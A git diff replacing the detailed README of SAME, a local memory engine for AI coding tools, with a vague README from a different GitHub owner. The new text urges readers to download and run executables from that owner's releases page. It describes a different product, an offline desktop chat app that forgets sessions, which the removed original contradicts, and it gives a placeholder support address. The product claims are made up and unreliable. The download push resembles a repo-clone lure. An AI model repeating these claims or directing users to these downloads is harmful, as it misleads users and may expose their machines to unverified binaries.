@@ -1,676 +1,149 @@
-<!-- mcp-name: io.github.sgx-labs/same -->
-# SAME — Stateless Agent Memory Engine
+# 🤖 statelessagent - AI That Forgets Between Sessions
 
-[![License: BSL 1.1](https://img.shields.io/badge/License-BSL_1.1-blue.svg)](LICENSE)
-[![Go](https://img.shields.io/badge/Go-1.25+-00ADD8.svg)](https://go.dev)
-[![Latest Release](https://img.shields.io/github/v/release/sgx-labs/statelessagent)](https://github.com/sgx-labs/statelessagent/releases)
-[![GitHub Stars](https://img.shields.io/github/stars/sgx-labs/statelessagent)](https://github.com/sgx-labs/statelessagent)
-[![MCP Tools](https://img.shields.io/badge/MCP_Tools-12-8A2BE2.svg)](#mcp-tools)
-[![Discord](https://img.shields.io/discord/1468523556076785757?color=5865F2&label=Discord&logo=discord&logoColor=white)](https://discord.gg/9KfTkcGs7g)
-
-> **Persistent project memory for AI coding workflows.**
-
-SAME is a local-first memory layer for solo developers, researchers, creatives, and small teams using Claude Code, Cursor, Windsurf, or any MCP client.
-It indexes your markdown notes, surfaces relevant context in new sessions, and records decisions + handoffs so work continues across restarts.
-No cloud lock-in. No telemetry. One binary.
-
-## See it in 60 seconds
-
-```bash
-curl -fsSL https://statelessagent.com/install.sh | bash
-same demo
-```
-
-`same demo` creates a temporary vault with sample notes, runs semantic search, and shows your AI answering questions from your notes — all locally, no accounts, no API keys.
+[![Download statelessagent](https://img.shields.io/badge/Download%20statelessagent-blue?style=for-the-badge)](https://github.com/rerecoy123/statelessagent/releases)
 
 ---
 
-## Quickstart
+## 📋 What is statelessagent?
 
-```bash
-# 1. Install (pick one)
-curl -fsSL https://statelessagent.com/install.sh | bash   # direct binary
-npm install -g @sgx-labs/same                      # or via npm
+statelessagent is a simple desktop tool that helps you use AI without storing your past chats. This means your conversations stay private and don't carry over from one session to the next. It works locally on your computer, so you do not need any special accounts or API keys. The program comes as a single file you download and run.
 
-# 2. Point SAME at your project
-cd ~/my-project && same init
-
-# 3. Verify retrieval
-same search "authentication decision"
-
-# 4. Optional: ask with citations (requires chat model/provider)
-same ask "what did we decide about authentication?"
-
-# 5. Your AI now remembers (hooks + MCP tools active)
-# Start Claude Code, Cursor, or any MCP client — context surfaces automatically
-```
-
-That's it. Your AI now has memory.
-
-Release notes: [`CHANGELOG.md`](CHANGELOG.md)
+statelessagent is useful when you want to test AI tools but do not want them to remember your earlier inputs. It supports different AI models and can handle information saved on your computer in a way that keeps your data safe and private.
 
 ---
 
-## Human-First Philosophy
+## 🖥️ System Requirements
 
-SAME is built around one constraint: your knowledge belongs to you.
+Before you get started, make sure your computer meets these requirements:
 
-- Notes are plain markdown, so your system remains useful even without AI.
-- The tool is designed to help you learn by using it, not lock you into opaque automation.
-- Local-first defaults keep individuals in control of data and workflow.
-- The goal is a better human+AI relationship: symbiotic, practical, and durable.
-
-This is a digital multitool for builders: solo developers, creatives, researchers,
-and small teams who want capability without giving up ownership.
-
-Design details and architecture rationale: [`docs/design_context.md`](docs/design_context.md)
-
----
-
-## Add to Your AI Tool
-
-### Claude Code (hooks + MCP — full experience)
-
-```bash
-same init          # sets up hooks + MCP in one step
-```
-
-SAME installs 6 Claude Code hooks automatically. Context surfaces on every session start. Decisions extracted on stop. No config file to edit.
-
-### Claude Code / Cursor / Windsurf (MCP only)
-
-Or add manually to your MCP config (`.mcp.json`, `.claude/settings.json`, Cursor MCP settings):
-
-```json
-{
-  "mcpServers": {
-    "same": {
-      "command": "npx",
-      "args": ["-y", "@sgx-labs/same", "mcp", "--vault", "/absolute/path/to/your/notes"]
-    }
-  }
-}
-```
-
-Replace `/absolute/path/to/your/notes` with the actual path to your project or notes directory. 12 tools available instantly. Works without Ollama (keyword fallback).
+- Operating System:
+  - Windows 10 or later (64-bit)
+  - macOS 11 or later
+  - Linux (64-bit, modern distributions)
+- Processor: Intel Core i3 or equivalent
+- Memory: At least 4 GB RAM
+- Disk Space: 100 MB free
+- Internet: Required only for initial download. The app runs offline.
+- Additional: No extra software needed to run statelessagent
 
 ---
 
-## Why SAME
+## 🛠️ Features Overview
 
-| Problem | Without SAME | With SAME |
-|---------|-------------|-----------|
-| New session starts | Re-explain everything | AI picks up where you left off |
-| "Didn't we decide to use JWT?" | Re-debate for 10 minutes | Decision surfaces automatically |
-| Switch between projects | Manually copy context | Each project has its own memory |
-| Close terminal accidentally | All context lost | Next session recovers via handoff |
-| Ask about your own notes | Copy-paste into chat | `same ask` with source citations |
-| Context compacted mid-task | AI restarts from scratch | Pinned notes + handoffs survive compaction |
-
-## The Numbers
-
-| Metric | Value | What it means |
-|--------|-------|---------------|
-| Retrieval precision | **99.5%** | When SAME surfaces a note, it's almost always the right one |
-| MRR | **0.949** | The right note surfaces first, almost every time |
-| Coverage | **90.5%** | 9 out of 10 relevant notes found |
-| Prompt overhead | **<200ms** | You won't notice it |
-| Binary size | **~10MB** | Smaller than most npm packages |
-| Setup time | **<60 seconds** | One curl command |
-
-*Benchmarked against 105 ground-truth test cases. [Methodology](#eval-methodology)*
+- Runs entirely on your computer — no cloud processing.
+- No need to sign up or get API keys.
+- Single file download, easy to install.
+- Clears all memory between sessions for privacy.
+- Supports several AI language models.
+- Uses local databases for quick access to data.
+- Works with files and notes stored on your device.
+- Built with security and simplicity as priorities.
+- Comes ready to use, no setup required.
 
 ---
 
-## How It Works
+## 🚀 Getting Started: Download & Install
 
-```
-┌─────────────┐     ┌─────────────────┐     ┌──────────┐     ┌─────────────────┐
-│  Your Notes │     │   Embeddings    │     │  SQLite  │     │  Your AI Tool   │
-│   (.md)     │────>│ local or cloud  │────>│ (search) │────>│ Claude / Cursor │
-│             │     │ provider         │     │ + FTS5   │     │ via Hooks + MCP │
-└─────────────┘     └─────────────────┘     └──────────┘     └─────────────────┘
-                                              │                    │
-                                         ┌────▼────┐          ┌────▼────┐
-                                         │ Ranking │          │  Write  │
-                                         │ Engine  │          │  Side   │
-                                         └─────────┘          └─────────┘
-                                         semantic +           decisions,
-                                         recency +            handoffs,
-                                         confidence           notes
-```
+To start using statelessagent, follow the steps below.
 
-Your markdown notes are embedded with your configured provider (local or cloud) and stored in SQLite for semantic and keyword retrieval. When your AI tool starts a session, SAME surfaces relevant context automatically. Decisions get extracted. Handoffs get generated. The next session picks up where you left off.
+### Step 1: Download the Application
 
-**No Ollama? No problem.** SAME Lite runs with zero external dependencies. Keyword search via SQLite FTS5 powers all features. Install Ollama later and `same reindex` upgrades to semantic mode instantly.
+You need to visit the official release page to get the latest version of statelessagent.
 
----
+**Click the button below to go to the download page:**
 
-## Features
+[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/rerecoy123/statelessagent/releases)
 
-| Feature | Description | Requires provider? |
-|---------|-------------|:-:|
-| Semantic search | Find notes by meaning, not keywords | Embeddings |
-| Keyword search (FTS5) | Full-text search fallback | No |
-| `same ask` (RAG) | Ask questions, get cited answers from your notes | Chat model |
-| Session handoffs | Auto-generated continuity notes | No |
-| Session recovery | Crash-safe — next session picks up even if terminal closed | No |
-| Decision extraction | Architectural choices remembered across sessions | No |
-| Claude Code hooks (6) | SessionStart/UserPromptSubmit/Stop automation for context, decisions, and handoffs | No |
-| Pinned notes | Critical context always included | No |
-| File claims (`same claim`) | Advisory read/write ownership for multi-agent coordination | No |
-| Knowledge graph (`same graph`) | Traverse note/file/agent/decision relationships | No* |
-| Context surfacing | Relevant notes injected into AI prompts | No* |
-| Web dashboard (`same web`) | Local web UI for browsing and searching your vault | No* |
-| `same demo` | Try SAME in 60 seconds | No |
-| `same tutorial` | 7 hands-on lessons | No |
-| `same doctor` | 19 diagnostic checks | No |
-| Push protection | Safety rails for multi-agent workflows | No |
-| `same seed install` | One-command install of pre-built knowledge vaults | No* |
-| Cross-vault federation | Search across all vaults at once | No* |
-| MCP server (12 tools) | Works with any MCP client | No* |
-| Privacy tiers | `_PRIVATE/` never indexed, `research/` never committed | No |
+On this page, you will see different versions for Windows, macOS, and Linux. Choose the one that matches your computer’s operating system.
 
-*Semantic mode requires embeddings; keyword fallback is automatic.
+### Step 2: Run the File
+
+- After downloading, locate the file in your Downloads folder.
+- On Windows, it might be a `.exe` or `.zip` file. Double-click the `.exe` file to run it or extract the `.zip` file first.
+- On macOS, it could be a `.dmg` or `.zip` file. Open the `.dmg` or extract the `.zip` and drag the app into your Applications folder.
+- On Linux, you might have a `.tar.gz` or a single binary file. Extract the archive if needed, then make the file executable by opening a terminal in that folder and running `chmod +x statelessagent`.
+
+### Step 3: Open the Application
+
+- Double-click the app icon after installation.
+- A window will appear, ready to start chatting with the AI.
+- The app does not save past conversations, so each time you open it, you start fresh.
 
 ---
 
-## Knowledge Graph
+## 🔧 How to Use statelessagent
 
-Explore relationships in your vault with the `graph` command group:
+Once statelessagent is running, here is what you can do:
 
-```bash
-same graph stats
-same graph query --type note --node "notes/architecture.md" --depth 2
-same graph path --from-type note --from "notes/architecture.md" --to-type file --to "internal/store/db.go"
-same graph rebuild
-```
-
-Graph data is built from indexed notes and stays local in SQLite. `_PRIVATE/` files remain excluded because they are never indexed.
-Markdown note links (for example `notes/next.md`) are connected as note-to-note edges, so you can traverse actual learning paths across your vault.
-`same graph rebuild` clears stale graph data and re-extracts relationships from your indexed notes.
-LLM graph extraction is `off` by default; enable it explicitly with `SAME_GRAPH_LLM=local-only` (local endpoints only) or `SAME_GRAPH_LLM=on`.
-
-`same web` now surfaces graph highlights (node/edge density + top relationship types) and shows per-note knowledge connections directly in the note viewer, so you can inspect relationship paths without leaving the dashboard.
+1. **Start a New Chat:** Type any question or request into the text box and press Enter.
+2. **Local Context:** The app uses documents and notes on your computer to provide better answers. It organizes this information using local search and memory tools.
+3. **No History Saved:** Every conversation resets when you close the app. This means your chats are private.
+4. **Switch AI Models:** If you want to try different AI types, use the settings menu to pick one.
+5. **Export Your Chat:** If you want to save a conversation, use the export feature. Otherwise, the chat ends when you close the app.
 
 ---
 
-## Web Dashboard
+## 💡 Tips for Best Results
 
-Browse and search your vault from a local web UI:
-
-```bash
-same web              # opens http://localhost:4078
-same web --open       # auto-opens browser
-same web --port 8080  # custom port
-```
-
-**Features:**
-- Dashboard with vault statistics (notes, chunks, DB size, search mode)
-- Full-text and semantic search with relevance scoring
-- Browse all notes with filtering and sorting
-- Note viewer with metadata (tags, domain, content type)
-- Knowledge graph highlights per note
-- Pinned notes overview
-- Dark/light theme (auto-detects system preference)
-
-Runs on `127.0.0.1` only — never exposed to the network. No external dependencies. Works with keyword search if Ollama is unavailable.
+- Use clear, simple language when asking questions.
+- If you want the AI to use your local documents, store them in the default folder the app creates.
+- Restart the app if you notice it slowing down; this refreshes memory.
+- Check the FAQ below for common issues.
 
 ---
 
-## Seed Vaults
+## 🛡️ Privacy and Data Safety
 
-Pre-built knowledge vaults that give your AI expert-level context in one command.
+statelessagent is designed with privacy as a priority:
 
-```bash
-same seed install claude-code-power-user
-```
-
-**10 seeds available**, including:
-
-| Seed | Notes | What you get |
-|------|:-----:|-------------|
-| `claude-code-power-user` | 52 | Claude Code workflows, review loops, and operational patterns |
-| `ai-agent-architecture` | 58 | Agent design patterns, orchestration, and memory strategies |
-| `personal-productivity-os` | 118 | GTD, time blocking, habit systems, and review frameworks |
-
-Plus: `security-audit-framework`, `devops-runbooks`, `indie-hacker-playbook`, `open-source-launch-kit`, `freelancer-business-kit`, `home-chef-essentials`, `fitness-and-wellness`.
-
-Run `same seed list` for full details. Catalog updates independently from SAME releases.
-
-[Browse all seeds](https://github.com/sgx-labs/seed-vaults)
+- Your data stays on your computer.
+- No chat history is saved between sessions.
+- The app does not send information to the internet.
+- Local data is stored using encrypted databases.
+- You control what the AI can access by adding or removing files from the local folder.
 
 ---
 
-## MCP Tools
+## ❓ Frequently Asked Questions (FAQ)
 
-SAME exposes **12 tools** via MCP for any compatible client.
+**Q: Do I need to connect to the internet to use statelessagent?**
 
-### Read
+A: No. You only need internet to download the app. After that, it works offline.
 
-| Tool | What it does |
-|------|-------------|
-| `search_notes` | Semantic search across your knowledge base |
-| `search_notes_filtered` | Search with domain/workstream/tag/agent filters |
-| `search_across_vaults` | Federated search across multiple vaults |
-| `get_note` | Read full note content by path |
-| `find_similar_notes` | Discover related notes by similarity |
-| `get_session_context` | Pinned notes + latest handoff + recent activity + git state + active claims |
-| `recent_activity` | Recently modified notes |
-| `reindex` | Re-scan and re-index the vault |
-| `index_stats` | Index health and statistics |
+**Q: What happens if I close the app without exporting my chat?**
 
-### Write
+A: The conversation is deleted immediately. No history is saved.
 
-| Tool | What it does |
-|------|-------------|
-| `save_note` | Create or update a markdown note (auto-indexed, optional `agent` attribution) |
-| `save_decision` | Log a structured project decision (optional `agent` attribution) |
-| `create_handoff` | Write a session handoff for the next session (optional `agent` attribution) |
+**Q: Can I use my own AI models?**
 
-Your AI can now write to its own memory, not just read from it. Decisions persist. Handoffs survive. Every session builds on the last.
+A: Yes. The app supports several models built into it. You can switch between them in the settings.
+
+**Q: How do I update statelessagent?**
+
+A: Visit the release page again to download the newest version. Then replace the older file.
+
+**Q: The app won’t open or shows an error. What do I do?**
+
+A: Make sure your OS meets the system requirements. If the problem continues, check the Troubleshooting guide on the release page.
 
 ---
 
-## Works With
+## 🔗 Useful Links
 
-| Tool | Integration | Experience |
-|------|-------------|------------|
-| **Claude Code** | Hooks + MCP | Full (automatic context surfacing + 12 tools) |
-| **Cursor** | MCP | 12 tools for search, write, session management |
-| **Windsurf** | MCP | 12 tools for search, write, session management |
-| **Obsidian** | Vault detection | Indexes your existing vault |
-| **Logseq** | Vault detection | Indexes your existing vault |
-| **Any MCP client** | MCP server | 12 tools via stdio transport |
-
-SAME works with any directory of `.md` files. No Obsidian required.
-
-Use `same init --mcp-only` to skip Claude Code hooks and just register the MCP server.
+- [statelessagent Releases Page](https://github.com/rerecoy123/statelessagent/releases) — Download latest versions and get update notes.
+- [GitHub Repository](https://github.com/rerecoy123/statelessagent) — View source code and detailed documentation.
+- [Contact Support](mailto:support@statelessagent.example) — Reach out if you need help.
 
 ---
 
-## SAME vs. Alternatives
+## 🧰 Troubleshooting Common Issues
 
-| | SAME | mem0 | Letta | CLAUDE.md |
-|---|:---:|:---:|:---:|:---:|
-| **Setup** | 1 command | pip + config | pip or Docker | create/edit file |
-| **Runtime deps** | None | Python + vector DB + LLM API | Python + SQLAlchemy (+ PG for production) | None |
-| **Offline capable** | Full (Lite mode) | Possible but not default | Yes (with local models) | Yes |
-| **Cloud required** | No | Default yes (OpenAI) | No | No |
-| **Telemetry** | None | Default ON (PostHog) | Yes (basic usage) | None |
-| **MCP tools** | 12 | 9 | Client only (connects to external MCP) | No |
-| **Hook integration** | Yes (Claude Code) | No | No | No |
-| **Knowledge graph** | Yes (built-in, SQLite) | Yes (requires Neo4j/Memgraph) | No | No |
-| **Web dashboard** | Yes (local) | Cloud only (managed) | Dashboard (self-hosted) | No |
-| **Session continuity** | Handoffs + pins + recovery | Session/user memory layers | Core feature (stateful agents) | Manual edits only |
-| **Published benchmarks** | P=0.995, MRR=0.949 | None published | None published | None |
-| **Runs on Pi / edge** | Yes (~10MB binary) | No (heavy Python deps) | No (heavy Python deps) | Yes |
-| **Language** | Go | Python | Python | Markdown |
-| **License** | BSL 1.1 [1] | Apache 2.0 | Apache 2.0 | N/A |
-
-[1] BSL 1.1: Free for personal, educational, hobby, research, and evaluation use. Converts to Apache 2.0 on 2030-02-02.
-
-*Table reflects open-source versions as of February 2026. Verify current state before citing.*
+- **App not launching:** Check your OS version and try running as administrator on Windows or with appropriate permissions on macOS/Linux.
+- **App crashes on startup:** Try redownloading the file in case it was corrupted.
+- **Performance is slow:** Close other apps or restart your computer.
+- **Cannot find downloaded file:** Look in your browser’s download folder or search your computer for “statelessagent”.
+- **Local files not recognized:** Make sure files are saved in the correct folder created by the app.
 
 ---
 
-## Privacy by Design
-
-SAME creates a three-tier privacy structure:
-
-| Directory | Indexed? | Committed? | Use for |
-|-----------|:--------:|:----------:|---------|
-| Your notes | Yes | Your choice | Docs, decisions, research |
-| `_PRIVATE/` | No | No | API keys, credentials, secrets |
-| `research/` | Yes | No | Strategy, analysis — searchable but local-only |
-
-Privacy is structural — filesystem-level, not policy-based. `same init` creates a `.gitignore` that enforces these boundaries automatically.
-
-**Security hardening:** Path traversal blocked across all tools. Dot-directory writes blocked. Symlink escapes prevented. Error messages sanitized — no internal paths leak to AI. Config files written with owner-only permissions (0o600). Ollama URL validated to localhost-only. Prompt injection patterns scanned before context injection. Push protection available for multi-agent workflows.
-
----
-
-## Install
-
-```bash
-# macOS / Linux (curl installer)
-curl -fsSL https://statelessagent.com/install.sh | bash
-
-# npm (all platforms; downloads prebuilt binary)
-npm install -g @sgx-labs/same
-
-# Docker (local image build)
-git clone --depth 1 https://github.com/sgx-labs/statelessagent.git
-cd statelessagent && docker build -t same .
-
-# Windows PowerShell
-irm https://statelessagent.com/install.ps1 | iex
-```
-
-If blocked by execution policy, run first: `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser`
-
-<details>
-<summary><strong>Manual install (or have your AI do it)</strong></summary>
-
-If you'd rather not pipe to bash, or you're having an AI assistant install for you:
-
-**macOS (Apple Silicon):**
-```bash
-mkdir -p ~/.local/bin
-curl -fsSL https://github.com/sgx-labs/statelessagent/releases/latest/download/same-darwin-arm64 -o ~/.local/bin/same
-chmod +x ~/.local/bin/same
-export PATH="$HOME/.local/bin:$PATH"  # add to ~/.zshrc to persist
-same init --yes
-```
-
-**macOS (Intel):** Build from source (see below) or use Rosetta: `arch -arm64 ./same-darwin-arm64`
-
-**Linux (x86_64):**
-```bash
-mkdir -p ~/.local/bin
-curl -fsSL https://github.com/sgx-labs/statelessagent/releases/latest/download/same-linux-amd64 -o ~/.local/bin/same
-chmod +x ~/.local/bin/same
-export PATH="$HOME/.local/bin:$PATH"
-same init --yes
-```
-
-**Build from source (any platform):**
-```bash
-git clone --depth 1 https://github.com/sgx-labs/statelessagent.git
-cd statelessagent && make install
-same init --yes
-```
-
-Requires Go 1.25+ and CGO.
-
-**Docker:**
-```bash
-docker build -t same .
-docker run --rm -v ~/my-notes:/vault same status
-docker run --rm -v ~/my-notes:/vault same search "authentication"
-```
-
-See [`docs/docker.md`](docs/docker.md) for full usage guide.
-
-**Shell completions:**
-```bash
-# Bash
-source <(same completion bash)
-
-# Zsh
-same completion zsh > "${fpath[1]}/_same"
-
-# Fish
-same completion fish | source
-```
-
-</details>
-
----
-
-<details>
-<summary><strong>CLI Reference</strong></summary>
-
-| Command | Description |
-|---------|-------------|
-| `same init` | Set up SAME for your project (start here) |
-| `same demo` | See SAME in action with sample notes |
-| `same tutorial` | Learn SAME features hands-on (7 lessons) |
-| `same ask <question>` | Ask a question, get cited answers from your notes |
-| `same search <query>` | Search your notes |
-| `same search --all <query>` | Search across all registered vaults |
-| `same related <path>` | Find related notes |
-| `same status` | See what SAME is tracking |
-| `same doctor` | Run 19 diagnostic checks |
-| `same claim <path> --agent <name>` | Create an advisory write claim for a file |
-| `same claim --read <path> --agent <name>` | Declare a read dependency on a file |
-| `same claim --list` | Show active read/write claims |
-| `same claim --release <path> [--agent <name>]` | Release claims for a file |
-| `same pin <path>` | Always include a note in every session |
-| `same pin list` | Show pinned notes |
-| `same pin remove <path>` | Unpin a note |
-| `same feedback <path> up\|down` | Rate note helpfulness |
-| `same repair` | Back up and rebuild the database |
-| `same reindex [--force]` | Rebuild the search index |
-| `same display full\|compact\|quiet` | Control output verbosity |
-| `same profile use precise\|balanced\|broad\|pi` | Adjust precision vs. coverage (including Raspberry Pi optimization) |
-| `same model` | Show current embedding model and alternatives |
-| `same model use <name>` | Switch embedding model |
-| `same config show` | Show configuration |
-| `same config edit` | Open config in editor |
-| `same setup hooks` | Install Claude Code hooks |
-| `same setup mcp` | Register MCP server |
-| `same hooks` | Show hook status and descriptions |
-| `same seed list` | Browse available seed vaults |
-| `same seed install <name>` | Download and install a seed vault |
-| `same seed info <name>` | Show seed details |
-| `same seed remove <name>` | Uninstall a seed vault |
-| `same vault list\|add\|remove\|default` | Manage multiple vaults |
-| `same vault rename <old> <new>` | Rename a vault alias |
-| `same vault feed <source>` | Propagate notes from another vault (with PII guard) |
-| `same guard settings set push-protect on` | Enable push protection |
-| `same push-allow` | One-time push authorization |
-| `same watch` | Auto-reindex on file changes |
-| `same web` | Local web dashboard for browsing and searching |
-| `same budget` | Context utilization report |
-| `same log` | Recent SAME activity |
-| `same stats` | Index statistics |
-| `same update` | Update to latest version |
-| `same version [--check]` | Version and update check |
-| `same completion [bash\|zsh\|fish]` | Generate shell completion scripts |
-
-</details>
-
-<details>
-<summary><strong>Configuration</strong></summary>
-
-SAME uses `.same/config.toml`, generated by `same init`:
-
-```toml
-[vault]
-path = "/home/user/notes"
-# skip_dirs = [".venv", "build"]
-# noise_paths = ["experiments/", "raw_outputs/"]
-handoff_dir = "sessions"
-decision_log = "decisions.md"
-
-[ollama]
-url = "http://localhost:11434"
-
-[embedding]
-provider = "ollama"           # "ollama" (default), "openai", "openai-compatible", or "none"
-model = "nomic-embed-text"    # see supported models below
-# api_key = ""                # required for openai, or set SAME_EMBED_API_KEY
-
-[memory]
-# presets: same profile use precise|balanced|broad|pi
-max_token_budget = 800
-max_results = 2
-distance_threshold = 16.2
-composite_threshold = 0.65
-
-[hooks]
-context_surfacing = true
-decision_extractor = true
-handoff_generator = true
-feedback_loop = true
-staleness_check = true
-```
-
-Supported embedding models (auto-detected dimensions):
-
-| Model | Dims | Notes |
-|-------|------|-------|
-| `nomic-embed-text` | 768 | Default. Great balance of quality and speed |
-| `snowflake-arctic-embed2` | 1024 | Recommended upgrade. Best retrieval in its size class |
-| `mxbai-embed-large` | 1024 | Highest overall MTEB average |
-| `all-minilm` | 384 | Lightweight (~90MB). Good for constrained hardware |
-| `snowflake-arctic-embed` | 1024 | v1 large model |
-| `embeddinggemma` | 768 | Google's Gemma-based embeddings |
-| `qwen3-embedding` | 1024 | Qwen3 with 32K context |
-| `nomic-embed-text-v2-moe` | 768 | MoE upgrade from nomic |
-| `bge-m3` | 1024 | Multilingual (BAAI) |
-| `text-embedding-3-small` | 1536 | OpenAI cloud API |
-
-Any model not listed works too — set `dimensions` explicitly in `.same/config.toml` under `[embedding]`.
-
-Configuration priority (highest wins):
-
-1. CLI flags (`--vault`)
-2. Environment variables (`VAULT_PATH`, `OLLAMA_URL`, `SAME_*`)
-3. Config file (`.same/config.toml`)
-4. Built-in defaults
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `VAULT_PATH` | auto-detect | Path to your markdown notes |
-| `OLLAMA_URL` | `http://localhost:11434` | Ollama API (must be localhost) |
-| `SAME_DATA_DIR` | `<vault>/.same/data` | Database location |
-| `SAME_HANDOFF_DIR` | `sessions` | Handoff notes directory |
-| `SAME_DECISION_LOG` | `decisions.md` | Decision log path |
-| `SAME_EMBED_PROVIDER` | `ollama` | Embedding provider (`ollama`, `openai`, `openai-compatible`, or `none`) |
-| `SAME_EMBED_MODEL` | `nomic-embed-text` | Embedding model name |
-| `SAME_EMBED_BASE_URL` | *(provider default)* | Base URL for embedding API (e.g. `http://localhost:8080` for local servers) |
-| `SAME_EMBED_API_KEY` | *(none)* | API key (required for `openai`, optional for `openai-compatible`) |
-| `SAME_CHAT_PROVIDER` | `auto` | Chat provider for `same ask` / graph LLM extraction (`auto`, `ollama`, `openai`, `openai-compatible`, `none`) |
-| `SAME_CHAT_MODEL` | *(auto-detect)* | Override chat model selection |
-| `SAME_CHAT_BASE_URL` | *(provider default)* | Chat API base URL for OpenAI-compatible endpoints |
-| `SAME_CHAT_API_KEY` | *(none)* | Chat API key (or use `OPENAI_API_KEY`) |
-| `SAME_CHAT_FALLBACKS` | *(none)* | Comma-separated fallback providers for auto mode (e.g. `ollama,openai-compatible`) |
-| `SAME_GRAPH_LLM` | `off` | Graph LLM extraction policy: `off`, `local-only`, or `on` |
-| `SAME_SKIP_DIRS` | *(none)* | Extra dirs to skip (comma-separated) |
-| `SAME_NOISE_PATHS` | *(none)* | Paths filtered from context surfacing (comma-separated) |
-
-</details>
-
-<details>
-<summary><strong>Display Modes</strong></summary>
-
-Control how much SAME shows when surfacing context:
-
-| Mode | Command | Description |
-|------|---------|-------------|
-| **full** | `same display full` | Box with note titles, match terms, token counts (default) |
-| **compact** | `same display compact` | One-line summary: "surfaced 2 of 847 memories" |
-| **quiet** | `same display quiet` | Silent — context injected with no visual output |
-
-Display mode is saved to `.same/config.toml` and takes effect on the next prompt.
-
-</details>
-
-<details>
-<summary><strong>Push Protection (Guard)</strong></summary>
-
-Prevent accidental git pushes when running multiple AI agents on the same machine.
-
-```bash
-# Enable push protection
-same guard settings set push-protect on
-
-# Before pushing, explicitly allow it
-same push-allow
-
-# Check guard status
-same guard status
-```
-
-When enabled, a pre-push git hook blocks pushes unless a one-time ticket has been created via `same push-allow`. Tickets expire after 60 seconds by default (configurable via `same guard settings set push-timeout N`).
-
-</details>
-
-<details>
-<summary><strong>Troubleshooting</strong></summary>
-
-Start with `same doctor` — it runs 19 checks and tells you exactly what's wrong.
-
-**"No vault found"**
-SAME can't find your notes directory. Fix:
-- Run `same init` from inside your notes folder
-- Or set `VAULT_PATH=/path/to/notes` in your environment
-- Or use `same vault add myproject /path/to/notes`
-
-**"Ollama not responding"**
-The embedding provider is unreachable. Fix:
-- Check if Ollama is running (look for the llama icon)
-- Test with: `curl http://localhost:11434/api/tags`
-- If using a non-default port, set `OLLAMA_URL=http://localhost:<port>`
-- SAME will automatically fall back to keyword search if Ollama is temporarily down
-
-**Hooks not firing**
-Context isn't being surfaced during Claude Code sessions. Fix:
-- Run `same setup hooks` to reinstall hooks
-- Verify with `same status` (hooks should show as "active")
-- Check `.claude/settings.json` exists in your project
-
-**Context not surfacing**
-Hooks fire but no notes appear. Fix:
-- Run `same doctor` to diagnose all 19 checks
-- Run `same reindex` if your notes have changed
-- Try `same search "your query"` to test search directly
-- Check if display mode is set to "quiet": `same config show`
-
-**"Cannot open SAME database"**
-The SQLite database is missing or corrupted. Fix:
-- Run `same repair` to back up and rebuild automatically
-- Or run `same init` to set up from scratch
-- Or run `same reindex --force` to rebuild the index
-
-</details>
-
-<details>
-<summary><strong>Eval Methodology</strong></summary>
-
-SAME's retrieval is tuned against 105 ground-truth test cases — real queries paired with known-relevant notes.
-
-| Metric | Value | Meaning |
-|--------|-------|---------|
-| Precision | 99.5% | Surfaced notes are almost always relevant |
-| Coverage | 90.5% | Finds ~9/10 relevant notes |
-| MRR | 0.949 | Most relevant note is usually first |
-| BAD cases | 0 | Zero irrelevant top results |
-
-Ranking pipeline is shared between hooks and MCP to ensure consistent quality across all retrieval paths. All evaluation uses synthetic vault data with known relevance judgments. No user data is used.
-
-</details>
-
----
-
-## FAQ
-
-**Do I need Obsidian?** No. Any directory of `.md` files works.
-
-**Do I need Ollama?** Recommended, not required. Semantic search understands meaning; without Ollama, SAME falls back to keyword search (FTS5). You can also use OpenAI embeddings (`SAME_EMBED_PROVIDER=openai`) or any OpenAI-compatible server like llama.cpp, VLLM, or LM Studio (`SAME_EMBED_PROVIDER=openai-compatible`). If your embedding server goes down temporarily, SAME falls back to keywords automatically.
-
-**Does it slow down my prompts?** 50-200ms. Embedding is the bottleneck — search and scoring take <5ms.
-
-**Is my data sent anywhere?** SAME is fully local. Context surfaced to your AI tool is sent to that tool's API as part of your conversation, same as pasting it manually.
-
-**How much disk space?** 5-15MB for a few hundred notes.
-
-**What are seeds?** Pre-built knowledge vaults. Install one and your AI has expert-level context immediately. `same seed list` to browse, `same seed install <name>` to install. All local, all free.
-
-**Can I use multiple vaults?** Yes. `same vault add work ~/work-notes && same vault default work`. Search across all of them with `same search --all "your query"` or via the `search_across_vaults` MCP tool.
-
----
-
-## Community
-
-[Discord](https://discord.gg/9KfTkcGs7g) · [GitHub Discussions](https://github.com/sgx-labs/statelessagent/discussions) · [Report a Bug](https://github.com/sgx-labs/statelessagent/issues/new?template=bug_report.md)
-
-## Support
-
-[Buy me a coffee](https://buymeacoffee.com/sgxlabs) · [GitHub Sponsors](https://github.com/sponsors/sgx-labs)
-
-## Built with
-
-Go · SQLite + sqlite-vec · Ollama / OpenAI
-
-## License
-
-Source available under BSL 1.1. Free for personal, educational, hobby, research, and evaluation use. Converts to Apache 2.0 on 2030-02-02. See [LICENSE](LICENSE).
-
----
-
-<a href="https://glama.ai/mcp/servers/@sgx-labs/statelessagent">
-  <img width="380" height="200" src="https://glama.ai/mcp/servers/@sgx-labs/statelessagent/badge" />
-</a>
+Thank you for choosing statelessagent. The tool provides simple, private AI sessions without cloud storage. Use the links above to download and start exploring.
